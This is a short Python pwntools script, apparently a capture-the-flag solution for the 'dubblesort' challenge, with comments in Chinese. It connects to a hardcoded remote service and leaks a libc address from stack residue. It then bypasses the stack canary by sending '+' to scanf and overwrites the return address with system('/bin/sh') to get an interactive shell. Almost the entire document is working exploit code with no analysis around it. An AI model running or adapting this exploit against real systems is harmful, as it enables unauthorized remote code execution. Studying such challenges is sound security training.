from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/dubblesort')

# p = process('../file/dubblesort')
# libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')
# leak_offset = 99518 # 本地

p = remote('61.147.171.105', '51935')
libc = ELF('../file/libc_32.so.6')
leak_offset = 0x1ae244 # 远程

pause()

# 泄露栈区残留的libc地址
p.sendafter(b'name :', b'a' * 28)
p.recvuntil(b'Hello ')
p.recv(28)
libc.address = u32(p.recv(4)) - leak_offset

# 返回地址前的空间 + 返回地址 + 随便填充 + 参数
num = int(0x80 / 4 + 1 + 1 + 1)
p.sendlineafter(b'sort :', str(num).encode())

# canary前的空间，填充比canary小的值即可
for i in range(int(0x60 / 4)):
    p.sendlineafter(b'number : ', b'0')

# cannary跳过
p.sendlineafter(b'number : ', b'+')

# 填充，要保证大于等于canary，同时小于等于system，canary的值是随机的，可以多试几次
for i in range(8):
    p.sendlineafter(b'number : ', str(libc.sym['system']).encode())

# payload构造
p.sendlineafter(b'number : ', str(libc.sym['system']).encode())
p.sendlineafter(b'number : ', str(next(libc.search(b'/bin/sh'))).encode())

p.interactive()